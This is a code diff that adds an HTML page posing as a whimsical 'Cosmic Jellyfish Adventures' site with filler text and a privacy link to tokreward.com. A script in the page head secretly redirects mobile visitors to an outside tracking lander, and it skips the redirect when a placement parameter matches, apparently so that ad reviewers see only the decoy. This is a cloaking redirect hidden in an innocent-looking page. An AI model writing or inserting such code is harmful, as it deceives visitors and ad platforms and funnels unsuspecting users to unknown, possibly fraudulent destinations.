@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Adventures</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+        }
+        main {
+            grid-column: 2 / 3;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: 10px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000;
+        }
+        a {
+            color: #ff00ff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Jellyfish Adventures</h1>
+        </header>
+        <aside>
+            <h2>Neon Tentacles</h2>
+            <p>Explore the bioluminescent wonders of deep space oceans!</p>
+        </aside>
+        <main>
+            <h2>Journey to the Quantum Abyss</h2>
+            <p>Embark on a mind-bending voyage through the cosmos, guided by our ethereal jellyfish companions. Discover new dimensions and unravel the mysteries of the universe!</p>
+        </main>
+        <aside>
+            <h2>Psychedelic Currents</h2>
+            <p>Ride the waves of consciousness through kaleidoscopic realities!</p>
+        </aside>
+        <footer>
+            <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+        </footer>
+    </div>
+</body>
+</html>
